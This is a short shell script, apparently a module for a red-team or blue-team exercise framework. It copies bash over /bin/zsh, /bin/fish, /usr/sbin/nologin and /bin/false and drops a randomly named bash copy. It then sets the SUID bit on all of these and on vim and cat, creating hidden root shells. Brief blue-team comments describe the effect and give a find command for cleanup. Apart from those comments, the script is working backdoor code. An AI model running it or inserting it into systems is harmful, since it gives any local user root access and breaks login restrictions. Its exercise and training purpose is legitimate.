#NAME suid_hell
#DESC hope you have file creation audit logs
#LEVEL 3

# BLUE TEAM INFO
# This script creates a bunch of SUID shells and marks some important binaries as SUID. SUID binaries run as whoever they're owned by, in most cases, that is root. So, these shells offer an easy way to privesc.
# REMEDIATION: Find all SUID binaries on your system and remove/un-SUID them. find / -perm -4000 2>/dev/null

cp -f /bin/bash /bin/zsh
cp -f /bin/bash /bin/fish
cp -f /bin/bash /usr/sbin/nologin
cp -f /bin/bash /bin/false
randVar=$(cat /dev/urandom | head -c 6 | base64 -w0 | tr -d "+" | tr -d "/")
cp -f /bin/bash /bin/$randVar
chmod +s /bin/bash /bin/zsh /bin/fish /usr/sbin/nologin /bin/false /bin/$randVar
#OUTPUT echo "SUID shell dropped as /bin/$randVar"

# Other important binaries
chmod +s /usr/bin/vim
chmod +s /bin/cat
